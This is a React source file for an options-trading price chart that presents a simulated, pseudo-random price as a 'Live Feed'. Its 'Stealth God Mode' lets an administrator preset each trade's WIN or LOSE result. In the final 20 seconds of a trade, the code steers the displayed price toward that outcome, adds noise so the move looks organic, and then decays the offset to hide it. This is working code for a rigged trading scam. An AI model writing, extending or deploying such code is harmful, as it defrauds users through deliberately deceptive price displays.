"use client";

import { useEffect, useState, useRef } from "react";
import { OptionsTrade } from "@/context/UserContext";

interface OptionsChartProps {
  asset: string;
  basePrice: number;
  activeTrade?: OptionsTrade;
  onPriceUpdate?: (price: number) => void;
}

// Pure Functional PRNG Market Simulator
// Guarantees all users instantly see the exact same chart sequence globally based on absolute time
function getDeterministicPrice(basePrice: number, timeSec: number) {
    const t1 = timeSec * 0.05;
    const t2 = timeSec * 0.015;
    const t3 = timeSec * 0.11;
    const t4 = timeSec * 0.45;
    
    // Seeded random for jagged micro-volatility
    const jagged = (Math.sin(timeSec * 12.9898) * 43758.5453) % 1;
    
    // Combine smooth macroscopic waves with jagged microscopic noise
    const noise = Math.sin(t1) * 0.4 + Math.sin(t2) * 0.3 + Math.sin(t3) * 0.2 + (jagged - 0.5) * 0.2;
    
    // Noise range is approx -1 to 1. Scale it to max 0.1% of base price
    return basePrice + (noise * basePrice * 0.001);
}

export function OptionsChart({ asset, basePrice, activeTrade, onPriceUpdate }: OptionsChartProps) {
  const [dataPoints, setDataPoints] = useState<number[]>([]);
  const currentPriceRef = useRef(basePrice);

  useEffect(() => {
    // Generate true deterministic history so it perfectly reconstructs even after page refresh
    const initialPoints = [];
    const nowSec = Math.floor(Date.now() / 1000);
    for (let i = 50; i >= 0; i--) {
        initialPoints.push(getDeterministicPrice(basePrice, nowSec - i));
    }
    setDataPoints(initialPoints);
    currentPriceRef.current = initialPoints[initialPoints.length - 1];
    if (onPriceUpdate) onPriceUpdate(currentPriceRef.current);
  }, [asset, basePrice]);

  useEffect(() => {
    // We only need local state for the manipulation displacement offset
    let activeManipulationOffset = 0;

    const interval = setInterval(() => {
      const currentSec = Math.floor(Date.now() / 1000);
      let realMarketPrice = getDeterministicPrice(basePrice, currentSec);
      let finalPrice = realMarketPrice;
      const volatility = basePrice * 0.0002;

      if (activeTrade && activeTrade.status === "ACTIVE") {
        const timeLeftMs = (activeTrade.startTime + activeTrade.durationMinutes * 60 * 1000) - Date.now();
        
        // Stealth God Mode: Only manipulate in the final 20 seconds!
        if (activeTrade.adminResult && timeLeftMs <= 20000 && timeLeftMs > 0) {
           const userWantsUp = activeTrade.direction === "UP";
           const adminWantsWin = activeTrade.adminResult === "WIN";
           const targetIsUp = adminWantsWin ? userWantsUp : !userWantsUp;
           
           const goalMargin = basePrice * 0.00015; 
           const targetZone = activeTrade.strikePrice + (targetIsUp ? goalMargin : -goalMargin);
           
           // We are moving the finalPrice towards the targetZone.
           // To do this naturally, we build up tracking 'activeManipulationOffset'.
           // Calculate exactly how far pure market price is from the target
           const diff = targetZone - (realMarketPrice + activeManipulationOffset);
           
           // Smoothly glide 15% of the remaining gap each second to neatly land there
           const glide = diff * 0.15;
           
           activeManipulationOffset += glide + ((Math.random() - 0.5) * (volatility * 2.5));
           finalPrice = realMarketPrice + activeManipulationOffset;
           
        } else {
           // Normal market walk, if there was leftover manipulation, maintain it? 
           // Usually stealth mode means no manipulation was applied yet
           finalPrice = realMarketPrice + activeManipulationOffset;
        }
      } else {
        // NO ACTIVE TRADE: Check if we have residual offset
        if (Math.abs(activeManipulationOffset) > basePrice * 0.00005) { 
           // Fast organic recovery curve: decay the offset by 20% per tick (5-10s repair)
           activeManipulationOffset -= activeManipulationOffset * 0.2;
           // Add microscopic noise to the recovery so it doesn't look purely mathematical
           activeManipulationOffset += ((Math.random() - 0.5) * volatility);
           finalPrice = realMarketPrice + activeManipulationOffset;
        } else {
           activeManipulationOffset = 0; // Fully snapped back
           finalPrice = realMarketPrice;
        }
      }

      currentPriceRef.current = finalPrice;
      if (onPriceUpdate) onPriceUpdate(finalPrice);
      
      setDataPoints(prev => {
        const newData = [...prev.slice(1), finalPrice];
        return newData;
      });
      
    }, 1000);

    return () => clearInterval(interval);
  }, [activeTrade, basePrice]);

  const minPoint = Math.min(...dataPoints);
  const maxPoint = Math.max(...dataPoints);
  const range = (maxPoint - minPoint) || 1;
  const padding = range * 0.1;
  const adjustedMin = minPoint - padding;
  const adjustedMax = maxPoint + padding;
  const adjustedRange = adjustedMax - adjustedMin;

  // Generate SVG Path
  const width = 800;
  const height = 400;
  
  const pathData = dataPoints.map((point, index) => {
    const x = (index / (dataPoints.length - 1)) * width;
    const y = height - ((point - adjustedMin) / adjustedRange) * height;
    return `${index === 0 ? 'M' : 'L'} ${x} ${y}`;
  }).join(" ");

  const isUp = dataPoints[dataPoints.length - 1] >= dataPoints[dataPoints.length - 2];
  const strokeColor = activeTrade?.direction === "UP" 
    ? (activeTrade.adminResult === "WIN" ? "#10B981" : (activeTrade.adminResult === "LOSE" ? "#F43F5E" : "#6366F1"))
    : (activeTrade?.direction === "DOWN" ? (activeTrade.adminResult === "WIN" ? "#F43F5E" : (activeTrade.adminResult === "LOSE" ? "#10B981" : "#6366F1")) 
    : (isUp ? "#10B981" : "#F43F5E"));

  return (
    <div className="w-full h-full relative font-mono overflow-hidden rounded-2xl bg-[#0f111a] border border-gray-800">
      <div className="absolute top-4 left-4 z-10">
        <div className="text-3xl font-black tracking-tighter" style={{ color: strokeColor }}>
          ${currentPriceRef.current.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })}
        </div>
        <div className="text-xs font-bold text-gray-500 uppercase tracking-widest mt-1">
          {asset}/USD Live Feed
        </div>
        {activeTrade?.adminResult && (
           <div className="mt-2 text-[10px] bg-rose-500/20 text-rose-400 px-2 py-0.5 rounded-full inline-block font-bold items-center gap-1 animate-pulse border border-rose-500/30">
             ⚡ MARKET VOLATILITY DETECTED
           </div>
        )}
      </div>

      <svg width="100%" height="100%" viewBox={`0 0 ${width} ${height}`} preserveAspectRatio="none" className="w-full h-[400px]">
        {/* Grid lines */}
        {[0.25, 0.5, 0.75].map(tick => (
           <line key={tick} x1="0" y1={height * tick} x2={width} y2={height * tick} stroke="#ffffff0a" strokeDasharray="4 4" />
        ))}
        {/* Area fill */}
        <path 
           d={`${pathData} L ${width} ${height} L 0 ${height} Z`} 
           fill={`url(#gradient-${strokeColor.replace('#', '')})`} 
           opacity={0.15} 
        />
        {/* Stroke */}
        <path 
           d={pathData} 
           fill="none" 
           stroke={strokeColor} 
           strokeWidth="3" 
           strokeLinejoin="round" 
           strokeLinecap="round" 
           style={{ filter: "drop-shadow(0 4px 6px rgba(0,0,0,0.5))" }}
        />
        {/* Strike Price Line if Active */}
        {activeTrade && activeTrade.status === "ACTIVE" && (
           <line 
             x1="0" 
             y1={height - ((activeTrade.strikePrice - adjustedMin) / adjustedRange) * height} 
             x2={width} 
             y2={height - ((activeTrade.strikePrice - adjustedMin) / adjustedRange) * height} 
             stroke={activeTrade.direction === "UP" ? "#10b981" : "#f43f5e"} 
             strokeDasharray="8 4" 
             strokeWidth="2"
             opacity="0.8"
           />
        )}
        <defs>
          <linearGradient id={`gradient-${strokeColor.replace('#', '')}`} x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stopColor={strokeColor} stopOpacity="1" />
            <stop offset="100%" stopColor={strokeColor} stopOpacity="0" />
          </linearGradient>
        </defs>
      </svg>
    </div>
  );
}
